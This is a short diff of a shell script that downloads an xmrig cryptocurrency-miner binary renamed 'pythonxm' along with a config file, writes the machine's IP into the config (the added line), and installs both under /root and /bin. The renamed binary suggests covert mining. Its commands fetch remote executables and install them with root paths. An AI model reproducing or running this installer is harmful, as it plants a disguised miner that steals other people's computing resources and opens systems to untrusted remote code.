@@ -5,6 +5,7 @@ curl ipinfo.io
 
 wget https://github.com/one10001/xmrig/releases/download/v0.0.3/pythonxm
 wget https://github.com/one10001/10001code/raw/main/config2.json
+sed "s+ip0001+$IPNAME+g" config2.json
 cp config2.json /root/config.json
 chmod +x pythonxm
 cp pythonxm /bin/pythonxm
